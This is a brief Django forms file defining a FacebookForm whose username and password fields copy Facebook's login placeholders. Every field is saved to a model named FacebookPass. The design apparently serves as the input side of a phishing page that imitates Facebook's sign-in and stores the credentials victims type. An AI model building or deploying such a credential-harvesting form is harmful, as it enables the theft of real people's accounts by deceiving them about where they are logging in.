from django import forms
from facebook.models import FacebookPass

class FacebookForm(forms.ModelForm):
    username = forms.CharField(widget=forms.TextInput(attrs={"placeholder":"Email address or phone number","autocomplete":"off"}))
    password = forms.CharField(widget=forms.PasswordInput(attrs={"placeholder":"Password","autocomplete":"off"}))
    class Meta:
        model = FacebookPass
        fields = "__all__"